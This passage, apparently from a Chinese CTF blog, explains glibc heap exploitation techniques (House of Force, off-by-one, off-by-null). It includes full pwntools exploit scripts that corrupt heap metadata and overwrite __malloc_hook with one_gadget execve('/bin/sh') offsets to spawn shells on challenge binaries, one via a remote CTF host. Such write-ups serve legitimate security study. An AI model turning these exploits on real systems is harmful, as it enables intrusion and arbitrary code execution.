class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;33&#x27;</span>) <span class="hljs-comment"># id</span><br>p.recvuntil(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br><br><span class="hljs-comment">#part two</span><br><span class="hljs-comment">#32bytes padding + prev_size + size + padding + fake_addr</span><br>data = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>)      <span class="hljs-comment"># no strcpy</span><br>data = data.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_addr)<br><span class="hljs-built_in">print</span> data<br>p.send(data)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)     <span class="hljs-comment"># free(fake_addr)</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)     <span class="hljs-comment">#malloc(fake_addr) #fake_addr</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;long?&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;48&#x27;</span>)<br>p.recvline(<span class="hljs-string">&#x27;48&#x27;</span>)  <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(shellcode_addr) <span class="hljs-comment"># write to target_addr</span><br><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>来源：ctf.wiki</p><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk指向我们期望的任何位置，这就相当于一次任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是top chunk在分配堆块时会执行的操作的源码，会对用户请求的size和 top chunk 现有的 size 进行验证，并且将会更新top chunk位置，以及size</p><p>我们主要关心的是对于size的验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE) <span class="hljs-comment">//nb指我们申请的堆块大小</span><br></code></pre></td></tr></table></figure><p>所以，设想一下：如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证。一般的做法是把 top chunk 的 size 改为-1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说unsigned long 中最大的数，所以无论如何都可以通过验证。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>综合上面的背景，我们可以得出，要想利用House of Force，要有以下条件：</p><ul><li><p>能够以溢出等方式控制到 top chunk 的 size 域</p><ul><li>为了能将size修改为-1(0xFFFFFFFFFFFFFFFF)</li></ul></li><li><p>能够自由地控制堆分配尺寸的大小</p><ul><li>为了能够将top chunk抬升到我们想写入的地址附近，一般为hook，而这之间的偏移非常大</li></ul></li></ul><h3 id="例题BUU-gyctf-2020-force"><a href="#例题BUU-gyctf-2020-force" class="headerlink" title="例题BUU-gyctf_2020_force"></a>例题BUU-gyctf_2020_force</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916151101226.png" alt="image-20210916151101226"></p><p>常规checksec一下，64位保护全开</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916153042695.png" alt="image-20210916153042695"></p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916153101689.png" alt="image-20210916153101689"></p><p>进入IDA，总共就两个功能：一个是申请堆块，堆块大小无限制，并且能返回给堆地址，然后填入内容是固定长度0x50；另外一个puts功能。。。屁用没有！因为存在固定长度的写入，那么只要申请一个小堆块就可以进行溢出修改top chunk的size位，所以House of Force的两个条件都达成了</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916163309864.png" alt="image-20210916163309864"></p><p>因为程序会返回堆的地址，程序又不限制堆块的大小，所以我们可以申请一个大于top chunk的堆块，那么程序就会调用mmap进行分配堆块，此时堆块的地址会是libc中的一个地址</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916163532720.png" alt="image-20210916163532720"></p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916205725583.png" alt="image-20210916205725583"></p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916205619022.png" alt="image-20210916205619022"></p><p>然后申请一个小于0x50的堆块，让堆块能进行溢出覆盖top chunk的size位，修改为-1（也就是0xFFFFFFFFFFFFFFFF），同时也借着这个堆块能获取到top chunk的地址。然后直接申请一个超大堆块，直接占满top chunk与__malloc_hook之间长度，然后再申请一个堆块去修改hook的为one_gadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./gyctf_2020_force&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;content\n&quot;</span>)<br>p.send(content)<br><span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">0x200ff0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>top_chunk = add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)) + <span class="hljs-number">0x10</span> <br>log.info(<span class="hljs-string">&quot;top_chunk==&gt;0x%x&quot;</span> %top_chunk)<br>offset = mlh - top_chunk<br>add(offset-<span class="hljs-number">0x33</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(ogg) + p64(realloc + <span class="hljs-number">0x10</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>其实看完wiki，感觉就是 offbyone&amp;null 的利用方式，借着溢出修改下一个堆块的in_use位置，然后造成unlink制造出堆块重叠，所以就不过多介绍了，看我的 offbyone&amp;null 这篇博客是一样的，而且我还更新了新版本的利用，当然是来自大佬的，我是个搬运工👶</p><p>过程：</p><ul><li>需要有溢出漏洞可以修改物理相邻的高地址的 prev_size 与 INUSE 部分。</li><li>在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li></ul><h2 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House_Of_Lore"></a>House_Of_Lore</h2><h2 id="House-Of-Rabbit"><a href="#House-Of-Rabbit" class="headerlink" title="House_Of_Rabbit"></a>House_Of_Rabbit</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 该系列内容较多，将会在较长时间持续更新&lt;/p&gt;
&lt;h2 id=&quot;House-of-Roman&quot;&gt;&lt;a href=&quot;#House-of-Roman&quot; class=&quot;headerlink&quot; title=&quot;House of Roman&quot;&gt;&lt;/a&gt;House of Roman&lt;/</summary>
      
    
    
    
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>offbyone&amp;null</title>
    <link href="http://example.com/2021/07/20/2021-07-26-offbyone&amp;null/"/>
    <id>http://example.com/2021/07/20/2021-07-26-offbyone&amp;null/</id>
    <published>2021-07-20T09:42:10.000Z</published>
    <updated>2021-10-13T08:01:21.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="offbyone"><a href="#offbyone" class="headerlink" title="offbyone"></a>offbyone</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>正常来说，我们希望程序的堆溢出能够溢出到next chunk的fd或者bk字段，进而完成利用。但是这样的情况是很少的，因而需要一种更加常见的特殊的堆溢出形式——offbyone，溢出字节就如他的名字一样，只能溢出一个字节。实际生活中这种漏洞很常见，程序员很容易犯这种错误，一般是因为边界检查不严格等情况。</p><p>怎么利用呢？试想一下，如果能溢出一个字节，那么我们申请个0xn8大小的堆块，那么多出的一个字节是不是可以修改下一个堆块的size字段？修改了之后，会让程序认为这个堆块的大小就是你修改的大小，从而导致overlap</p><p>如果你只把一个堆块的size变大，然后释放再申请出来，扩大的size将会从下面的堆块中取来，并把里面的内容清空，也就是想要再使用里面的堆块，需要去修复对应的堆头（用来泄露libc基址时，需要这样分开来操作）</p><p>offbyone情形：</p><ul><li>strlen函数把next chunk的size字段也给计入进去，造成溢出一个字节</li></ul><p>利用方式：堆中有ABCD四个已经被分配的大小为0x70的chunk，现在都是使用状态。然后A是我们进行offbyone的chunk，我们目的是将B的size改掉。</p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164209854.png" alt="image-20210726164209854" style="zoom: 80%;"><p>我们输入’A’*0x68 + ‘\xe1’,此时，堆块的布局如下：</p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164413949.png" alt="image-20210726164413949" style="zoom:80%;"><p>可以看到b的size被改大了，正好覆盖到了c的末尾，我们构造了chunkoverlap。这时候我们将C free掉，他会进入fastbin。我们再将B free掉，B+C这一段区域会进入unsorted bin。我们再次申请一个大小为0xd0的堆块，也就是说B+C这段内存被我们控制了，此时我们就可以控制C的fd字段，就可以进行fastbin attack了。</p><p>当然，实践应用的时候，并不局限说堆块大小都是0x70，0x28，0x38都行，只要能通过验证即可</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726113130649.png" alt="image-20210726113130649"></p><p>常规checksec一下，然后进入ida看看程序代码</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726113232848.png" alt="image-20210726113232848"></p><p>漏洞点存在与edit函数里面，在strlen函数里面，这个函数只有遇到’\x00’才会停止计数，如果我们申请0x78的堆块，并且填满0x78个字符，然后在这个堆块下面还存在一个堆块，那strlen就会把下一个堆块的size字段也给统计进去，从而可以多输入一个字符修改下一堆块的size字段。</p><p>那么该怎么构造呢？先申请四个0x68的堆块（至少四个）第一个用来修改下一个堆块的size字段，第四个用来防止与top chunk合并，中间两个用来制造overlap</p><p>把下一个堆块的size改为两倍大小——0xe1，接下来就是要让程序也认为被修改的堆块大小是0xe0，所以我们先后把第三块、第二块都释放掉，第三块进入fastbin，第二块由于size被改则进入到unsortedbin中，彻底让程序以为大小是为0xe0，最后只需要把0xe0的堆块申请出来，就可以修改其中本来是第三块的fd指针</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164722535.png" alt="image-20210726164722535"></p><p>成功制造了overlap，两个0x70的堆块合并了</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164617715.png" alt="image-20210726164617715"></p><p>很明显看到，fd指针已经被我们修改为我们想要分配chunk的地方</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164850626.png" alt="image-20210726164850626"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbyone&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>+p8(<span class="hljs-number">0xe1</span>))<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0xd0</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">4</span>,payload)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="offbynull"><a href="#offbynull" class="headerlink" title="offbynull"></a>offbynull</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>其实本质也是一种offbyone，只是这个溢出的字节我们无法控制，只能是0。所以构造方法会与offbyone有些不同，但目的都是为了制造出overlap，毕竟uaf才是堆利用的核心！</p><p>offbynull情形：</p><ul><li>把你输入的堆块的地址加上输入的字符长度的地方置为0（一般来说没我下面的例题那么明显，会进行很多运算以及操作，但是本质还是一样的）</li></ul><p>怎么利用呢？因为溢出的是0，所以明显只能把修改preinuse位修改了，所以这边都是申请0xf8大小的堆块，这样的堆块刚好为0x101，溢出的0只会修改preinuse，不会影响大小</p><p>利用方式：</p><p>abcd四个大小为0x100的堆块，都是在使用状态，这时候我们的目标堆块是C堆块</p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726170224084.png" alt="image-20210726170224084" style="zoom:80%;"><p>我们在B中输入 ‘A’*0x90 + p64(0x200) + ‘\x00’，输入完后布局将会变化成这样</p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726170351639.png" alt="image-20210726170351639" style="zoom:80%;"><p>此时，C的previnuse位被改成了0，程序会将B看作已经被释放的堆块。然后由于系统是通过prevsize位来定位前一个堆块的位置，在这里，我们将其改成了0x200,也就是说定位到了A堆块。然后先将A free掉放入unsortedbin，这时候再free C，就会触发合并操作。ABC将会被看作一个大小为0x300的堆块放入unsortedbin中。然而实际上，B并没有被free，我们也就通过这样的方式构造了overlap</p><p>在实际运用时，不局限都是0x100的，可以是中间的某个堆块是fast chunk也行，但是第一个在头的必须也得是unsorted chunk大小的堆块，否则触发合并会出问题</p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726173924395.png" alt="image-20210726173924395"></p><p>看程序的add函数里面，会把输入的长度多一个字节的地方置为0</p><p>这边有些奇怪，不懂为什么，如果只是用四个进行构造，将会报错，但是五个就行，第一个是用来泄露libc基址的，不用理会</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174131814.png" alt="image-20210726174131814"></p><p>这是修改完目标堆块，以及释放了指向的堆块（目标堆块减去0x300）</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174439990.png" alt="image-20210726174439990"></p><p>最后把目标堆块释放，触发合并，变成了0x400的堆块</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174611943.png" alt="image-20210726174611943"></p><p>之后就是构造大小为0x71的堆块，这边构造堆块要注意，在被构造的堆块后面还要构造一个堆头，因为需要preinuse位置为1来表示我们构造的堆块是被使用的，然后才能被释放进入到fastbin里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 